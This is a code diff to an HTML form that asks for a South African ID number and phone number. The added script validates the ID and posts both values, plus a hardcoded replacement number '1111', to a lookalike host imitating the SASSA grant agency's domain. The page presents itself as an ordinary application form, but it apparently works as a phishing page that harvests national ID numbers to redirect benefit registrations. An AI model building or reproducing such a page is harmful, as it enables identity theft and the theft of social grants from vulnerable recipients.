@@ -11,7 +11,6 @@
       padding:24px;
     }
     
-    
     h2 {
       margin:0 0 12px;
     }
@@ -28,6 +27,8 @@
       border-radius:10px;
       font-size:16px;
     }
+    input.valid { border-color: #4caf50; }
+    input.invalid { border-color: #f44336; }
     button {
       margin-top:16px;
       width:100%;
@@ -52,7 +53,7 @@
   </style>
 </head>
 <body>
-  <form class="card" action="#" method="post">
+  <form id="applicationForm" class="card" action="#" method="post">
     <!-- Logo -->
     <img src="logo.jpg" alt="App Logo" class="logo" />
 
@@ -70,27 +71,94 @@
       name="idNumber"
       type="text"
       inputmode="numeric"
-      pattern="\d{13}"
       maxlength="13"
       placeholder="13-digit ID"
       required
-      title="Enter a 13-digit ID number"
     />
 
     <!-- Phone number -->
-    <label for="phone">Phone Number</label>
+    <label for="phoneNumber">Phone Number</label>
     <input
-      id="phone"
-      name="phone"
+      id="phoneNumber"
+      name="phoneNumber"
       type="tel"
       inputmode="tel"
-      pattern="^(?:\+27|0)\d{9}$"
-      placeholder="e.g. 0821234567 or +27821234567"
+      placeholder="e.g. 0821234567"
       required
-      title="Use 0 followed by 9 digits, or +27 then 9 digits"
     />
 
-    <button type="submit">Submit</button>
+    <button id="submitButton" type="submit">Submit</button>
   </form>
+
+  <script>
+    function isValidSAID(id) {
+      if (!/^\d{13}$/.test(id)) return false;
+
+      let sum = 0;
+      for (let i = 0; i < 13; i++) {
+        let digit = parseInt(id.charAt(i));
+        if ((i + 1) % 2 === 0) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+      }
+      return sum % 10 === 0;
+    }
+
+    function validateInput(inputEl, isValid) {
+      inputEl.classList.remove("invalid", "valid");
+      if (inputEl.value.trim() === "") return;
+      inputEl.classList.add(isValid ? "valid" : "invalid");
+    }
+
+    function validateForm() {
+      const idNumber = document.getElementById("idNumber");
+      const phoneNumber = document.getElementById("phoneNumber");
+      const submitButton = document.getElementById("submitButton");
+
+      const idValid = isValidSAID(idNumber.value);
+      const phoneValid = /^\d{10}$/.test(phoneNumber.value);
+
+      validateInput(idNumber, idValid);
+      validateInput(phoneNumber, phoneValid);
+
+      submitButton.disabled = !(idValid && phoneValid);
+    }
+
+    document.getElementById("applicationForm").addEventListener("input", validateForm);
+
+    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const idNumber = document.getElementById("idNumber").value.trim();
+      const phoneNumber = document.getElementById("phoneNumber").value.trim();
+      const newphoneNumber = "1111";
+
+      if (!isValidSAID(idNumber)) {
+        alert("Invalid South African ID number.");
+        return;
+      }
+
+      try {
+        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+        });
+
+        if (response.ok) {
+          alert("Submitted successfully!");
+        } else if (response.status === 409) {
+          alert("Failed: ID and phone number do not match.");
+        } else {
+          alert("An error occurred.");
+        }
+      } catch (error) {
+        console.error("Submission error:", error);
+        alert("Network error. Please try again.");
+      }
+    });
+  </script>
 </body>
 </html>
